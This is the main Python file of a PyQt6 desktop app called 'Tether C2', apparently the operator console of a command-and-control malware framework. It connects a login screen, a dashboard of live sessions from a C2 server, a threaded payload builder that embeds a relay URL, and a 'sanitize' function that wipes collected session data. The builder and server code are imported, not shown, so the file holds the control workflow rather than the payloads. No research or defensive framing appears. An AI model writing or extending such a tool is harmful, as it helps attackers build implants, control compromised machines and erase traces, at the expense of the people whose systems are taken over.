# main.py (Definitive, Final UI & Logic)
import sys
from PyQt6.QtWidgets import QApplication, QMainWindow, QStackedWidget
from PyQt6.QtCore import QThread, pyqtSignal

from ui.login_screen import LoginScreen
from ui.dashboard_window import DashboardWindow
from database import DatabaseManager
from c2_server import C2Server
from builder import build_payload
from config import RELAY_URL

class BuildThread(QThread):
    log_message = pyqtSignal(str)
    finished = pyqtSignal()
    def __init__(self, settings, relay_url, c2_user):
        super().__init__(); self.settings, self.relay_url, self.c2_user = settings, relay_url, c2_user
        self.proc = None; self._is_running = True
    def run(self):
        self.proc = build_payload(self.settings, self.relay_url, self.c2_user, self.log_message.emit, self)
        if self._is_running: self.finished.emit()
    def stop(self):
        self._is_running = False
        if self.proc:
            try: self.proc.terminate()
            except: pass

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__(); self.setWindowTitle("Tether C2"); self.setGeometry(100, 100, 1400, 800)
        self.db = DatabaseManager(); self.c2_server = C2Server(self.db); self.current_user = None
        self.stack = QStackedWidget(); self.setCentralWidget(self.stack)
        self.login_screen = LoginScreen(self.db); self.stack.addWidget(self.login_screen)
        self.login_screen.login_successful.connect(self.show_dashboard)
        remembered_user = self.db.load_setting("remembered_user")
        if remembered_user: self.show_dashboard(remembered_user)
        else: self.stack.setCurrentWidget(self.login_screen)

    def show_dashboard(self, username):
        self.current_user = username
        self.dashboard = DashboardWindow(self.db); self.stack.addWidget(self.dashboard)
        self.stack.setCurrentWidget(self.dashboard)
        self.dashboard.sign_out_requested.connect(self.handle_sign_out)
        self.dashboard.sanitize_requested.connect(self.handle_sanitize)
        self.dashboard.setting_changed.connect(self.db.save_setting)
        self.dashboard.build_requested.connect(self.start_build)
        self.c2_server.sessions_updated.connect(self.dashboard.update_session_table)
        self.c2_server.start(self.current_user)
        
    def start_build(self, settings):
        self.dashboard.builder_pane.show_build_log_pane()
        self.build_thread = BuildThread(settings, RELAY_URL, self.current_user)
        self.build_thread.log_message.connect(self.dashboard.builder_pane.build_log_output.append)
        self.build_thread.finished.connect(self.on_build_finished)
        self.dashboard.builder_pane.stop_build_button.clicked.connect(self.stop_build)
        self.build_thread.start()

    def stop_build(self):
        """DEFINITIVE FIX: Stops the thread and shows the back button."""
        self.build_thread.stop()
        self.on_build_finished()

    def on_build_finished(self):
        self.dashboard.builder_pane.stop_build_button.setEnabled(False)
        self.dashboard.builder_pane.back_to_builder_button.show()
        
    def handle_sign_out(self):
        self.db.save_setting("remembered_user", "")
        self.c2_server.stop()
        self.stack.setCurrentWidget(self.login_screen)
        self.stack.removeWidget(self.dashboard); self.dashboard.deleteLater()
        
    def handle_sanitize(self):
        self.c2_server.sanitize_all_data(self.current_user)
        self.dashboard.update_session_table({})

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())